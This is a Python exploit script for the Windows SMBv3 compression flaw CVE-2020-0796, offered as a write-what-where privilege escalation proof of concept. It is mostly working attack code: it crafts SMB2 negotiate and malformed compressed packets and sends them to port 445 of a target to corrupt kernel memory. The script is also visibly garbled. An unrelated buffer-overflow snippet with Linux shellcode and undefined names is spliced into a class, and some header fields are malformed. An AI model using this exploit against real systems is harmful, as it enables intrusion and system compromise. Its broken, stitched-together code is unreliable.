# Windows Kernel Write-What-Where CVE-2020-0796 Exploit
# Intended only for educational and testing in corporate environments.
# MasterSpl0it takes no responsibility for the code, use at your own risk.
# Mast3rSpl0it@gmail.com
# Rewritten CVE-2020-0796 Local Privilege Escalation POC.


import socket, struct, sys
import os, binascii, ctypes

class Smb2Header:
    def __init__(self, command, message_id):
        self.protocol_id = "\xfeSMB"
        self.structure_size = "\x40\x00"  
        self.credit_charge = "\x00"*2
        self.channel_sequence = "\x00"*2
        self.channel_reserved = "\x00"*2
        self.command = command
        self.credits_requested = "\x00"*2  
        self.flags = "\x00"*4
        self.chain_offset = "\x00"*4  
        self.message_id = message_id
        self.reserved = "\x00"*4
        self.tree_id = "\x00"*4  
        self.session_id = "\x00"*8
        self.signature = "\x00"*16

    def get_packet(self):
        return self.protocol_id + self.structure_size + self.credit_charge + self.channel_sequence + self.channel_reserved + self.command + self.credits_requested + self.flags + self.chain_offset + self.message_id + self.reserved + self.tree_id + self.session_id + self.signature

class Smb2NegotiateRequest:
    def __init__(self):
        self.header2 = Smb2Header("\0x1100"*2, "\0x2100"*8)
        self.structure_size2 = "\0x4100\0x8100"
        self.dialect_count2 = "\0x10100\0x20100"  
        self.security_mode2 = "\x00"*2
        self.reserved2 = "\0x40100"*2
        self.capabilities2 = "\0x80100\0x80100\0x100100\x00"
        self.header = Smb2Header("\x00"*2, "\x00"*8)
        self.structure_size = "\x24\x00"
        self.dialect_count = "\x08\x00"  
        self.security_mode = "\x00"*2
        self.reserved = "\x00"*2
        self.capabilities = "\x7f\x00\x00\x00"
        self.guid = "\x01\x02\xab\xcd"*4
        self.negotiate_context = "\x78\x00"
        self.additional_padding = "\x00"*2
        self.negotiate_context_count = "\x02\x00"  
        self.reserved_2 = "\x00"*2
        self.dialects = "\x02\x02" + "\x10\x02" + "\x22\x02" + "\x24\x02" + "\x00\x03" + "\x02\x03" + "\x10\x03" + "\x11\x03"  # SMB 2.0.2, 2.1, 2.2.2, 2.2.3, 3.0, 3.0.2, 3.1.0, 3.1.1
        self.padding = "\x00"*4
        payload = """
        \xEB\x19\x31\xC0\x31\xDB\x31\xD2\x31\xC9\xB0\x04\xB3
        \x01\x59\xB2\x07\xCD\x80\x31\xC0\xB0\x01\x31\xDB\xCD
        \x80\xE8\xE2\xFF\xFF\xFF\x68\x61\x63\x6B\x65\x64\x21
        """.strip()
        padding = 1

def overflow():
  nops = "\x90" * 100
  rets = buffer_addr * 200
  code = nops + payload + ("A" * padding) + rets
  return code

def exploit():
  connection = httplib.HTTPConnection(host, port)
  connection.request("GET", overflow())
  response = connection.getresponse()

    def context(self, type, length):
        data_length = length
        reserved = "\x00"*4
        return type + data_length + reserved

    def preauth_context(self):
        hash_algorithm_count = "\x01\x00"  
        salt_length = "\x20\x00"
        hash_algorithm = "\x01\x00"  
        salt = "\x00"*32
        pad = "\x00"*2
        length = "\x26\x00"
        context_header = self.context("\x01\x00", length)
        return context_header + hash_algorithm_count + salt_length + hash_algorithm + salt + pad

    def compression_context(self):
        compression_algorithm_count = "\x03\x00"  
        compression_algorithm_count = "\x01\x00"
        padding = "\x00"*2
        flags = "\x01\x00\x00\x00"
        algorithms = "\x01\x00" + "\x02\x00" + "\x03\x00"  # LZNT1 + LZ77 + LZ77+Huffman
        algorithms = "\x01\x00"
        length = "\x0e\x00"
        length = "\x0a\x00"
        context_header = self.context("\x03\x00", length)
        return context_header + compression_algorithm_count + padding + flags + algorithms

    def get_packet(self):
        padding = "\x00"*8
        return self.header.get_packet() + self.structure_size + self.dialect_count + self.security_mode + self.reserved + self.capabilities + self.guid + self.negotiate_context + self.additional_padding + self.negotiate_context_count + self.reserved_2 + self.dialects + self.padding + self.preauth_context() + self.compression_context() + padding

class NetBIOSWrapper:
    def __init__(self, data):
        self.session = "\x00"
        self.length = struct.pack('>i', len(data)).decode('latin1')[1:]
        self.data = data

    def get_packet(self):
        return self.session + self.length + self.data

class Smb2CompressedTransformHeader:
    def __init__(self, raw_data, compressed_data):
        self.protocol_id = "\xfcSMB"
        self.original_decompressed_size = struct.pack('<i', -1).decode('latin1')
        self.compression_algorithm = "\x01\x00"
        self.flags = "\x00"*2
        self.offset = struct.pack('<i', len(raw_data)).decode('latin1')
        self.data = (raw_data + compressed_data).decode('latin1')

    def get_packet(self):
        return self.protocol_id + self.original_decompressed_size + self.compression_algorithm + self.flags + self.offset + self.data

def send_negotiation(sock):
    negotiate = Smb2NegotiateRequest()
    packet = NetBIOSWrapper(negotiate.get_packet()).get_packet()
    sock.send(packet.encode('latin1'))
    sock.recv(3000)

def send_compressed(sock, raw_data, compressed_data):
    compressed = Smb2CompressedTransformHeader(raw_data, compressed_data)
    packet = NetBIOSWrapper(compressed.get_packet()).get_packet()
    sock.send(packet.encode('latin1'))
    try:
        sock.recv(1000)
    except ConnectionResetError:
        pass  # expected, ignore

def compress(buffer_in):
    '''Compress a buffer with a specific format.'''
    COMPRESSION_FORMAT_LZNT1 = 2
    COMPRESSION_FORMAT_XPRESS = 3  
    COMPRESSION_FORMAT_XPRESS_HUFF = 4  
    COMPRESSION_ENGINE_STANDARD = 0
    COMPRESSION_ENGINE_MAXIMUM = 256
    RtlCompressBuffer = ctypes.windll.ntdll.RtlCompressBuffer
    RtlGetCompressionWorkSpaceSize = ctypes.windll.ntdll.RtlGetCompressionWorkSpaceSize

    fmt_engine = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD
    workspace_size = ctypes.c_ulong(0)
    workspace_fragment_size = ctypes.c_ulong(0)
    res = RtlGetCompressionWorkSpaceSize(
        ctypes.c_ushort(fmt_engine),
        ctypes.pointer(workspace_size),
        ctypes.pointer(workspace_fragment_size)
    )

    assert res == 0, 'RtlGetCompressionWorkSpaceSize failed.'

    workspace = ctypes.c_buffer(workspace_size.value)
    buffer_out = ctypes.c_buffer(1024 + len(buffer_in) + len(buffer_in) // 10)
    compressed_size = ctypes.c_ulong(0)
    res = RtlCompressBuffer(
        ctypes.c_ushort(fmt_engine),
        buffer_in,
        len(buffer_in),
        buffer_out,
        len(buffer_out),
        ctypes.c_ulong(4096),
        ctypes.pointer(compressed_size),
        workspace
    )

    assert res == 0, 'RtlCompressBuffer failed.'
    return buffer_out.raw[: compressed_size.value]

def write_what_where(ip_address, what, where):
    sock = socket.socket(socket.AF_INET)
    sock.settimeout(3)
    sock.connect((ip_address, 445))
    send_negotiation(sock)

    data_to_compress = os.urandom(0x1100 - len(what))
    data_to_compress += b"\x00" * 0x18
    data_to_compress += struct.pack('<Q', where)  
    raw_data = what
    compressed_data = compress(data_to_compress)
    send_compressed(sock, raw_data, compressed_data)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        exit("[-] Usage: {} IP_ADDR WHAT WHERE".format(sys.argv[0]))

    write_what_where(sys.argv[1], binascii.unhexlify(sys.argv[2]), int(sys.argv[3], 0))
